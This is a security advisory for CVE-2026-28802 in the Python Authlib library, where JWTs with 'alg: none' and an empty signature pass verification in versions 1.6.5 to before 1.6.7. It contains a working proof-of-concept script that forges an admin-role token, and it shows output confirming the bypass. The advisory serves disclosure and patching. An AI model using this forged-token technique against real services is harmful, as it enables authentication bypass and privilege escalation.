# [H] Authlib: Setting `alg: none` and a blank signature appears to bypass signature verification

## Summary
Severity: High
Advisory: GHSA-7wc2-qxgw-g8gg
CVE: CVE-2026-28802
CWE: CWE-347
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-03-04
Source: https://github.com/advisories/GHSA-7wc2-qxgw-g8gg
Type: github-advisory

## Affected
- PyPI: `authlib` — affected >=1.6.5 <1.6.7

## Details
### Summary
After upgrading the library from 1.5.2 to 1.6.0 (and the latest 1.6.5) it was noticed that previous tests involving passing a malicious JWT containing alg: none and an empty signature was passing the signature verification step without any changes to the application code when a failure was expected. 

### Details
It was likely introduced in this commit:
https://github.com/authlib/authlib/commit/a61c2acb807496e67f32051b5f1b1d5ccf8f0a75

### PoC
```
from authlib.jose import jwt, JsonWebKey
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
import json
import base64


def create_jwks():
    private_key = rsa.generate_private_key(
        public_exponent=65537, key_size=2048, backend=default_backend()
    )
    public_pem = private_key.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    jwk = JsonWebKey.import_key(public_pem).as_dict()
    jwk["kid"] = "test-key-001"
    jwk["use"] = "sig"
    jwk["alg"] = "RS256"
    jwks = {"keys": [jwk]}
    return jwks


def create_forged_token_with_alg_none():
    forged_header = {"alg": "none"}
    forged_payload = {
        "sub": "user123",
        "role": "admin",
        "iat": 1735603200,
    }

    header_b64 = base64.urlsafe_b64encode(
        json.dumps(forged_header).encode("utf-8")
    ).rstrip(b"=")

    payload_b64 = base64.urlsafe_b64encode(
        json.dumps(forged_payload).encode("utf-8")
    ).rstrip(b"=")

    forged_token = header_b64 + b"." + payload_b64 + b"."
    return forged_token


jwks = create_jwks()
forged_token = create_forged_token_with_alg_none()
try:
    claims = jwt.decode(forged_token, jwks)
    print(f"VULNERABLE: Forged token (alg:none) accepted: role={claims['role']}")
except Exception as e:
    print(f"SECURE: Token rejected - {type(e).__name__}")
```

Output:
```
pip install -q authlib==1.5.2
python3 authlib_alg_none_vulnerability.py 
SECURE: Token rejected - BadSignatureError
pip install -q authlib==1.6.5
python3 authlib_alg_none_vulnerability.py 
VULNERABLE: Forged token (alg:none) accepted: role=admin
```

### Impact
Users of the library are likely not aware that they now need to check the provided headers and disallow `alg: none` usage, it is not obvious from the release notes that any action needs to be taken. As a best-practice, the library should adopt a 'secure by default' stance and default to rejecting it and allow the application to provide an algorithm whitelist.

Applications using this library for authentication or authorization may accept malicious, forged JWTs, leading to:
- Authentication bypass
- Privilege escalation
- Unauthorized access
- Modification of application data

## References
- https://github.com/authlib/authlib/security/advisories/GHSA-7wc2-qxgw-g8gg
- https://nvd.nist.gov/vuln/detail/CVE-2026-28802
- https://github.com/authlib/authlib/commit/a61c2acb807496e67f32051b5f1b1d5ccf8f0a75
- https://github.com/authlib/authlib/commit/b87c32ed07b8ae7f805873e1c9cafd1016761df7
- https://github.com/authlib/authlib
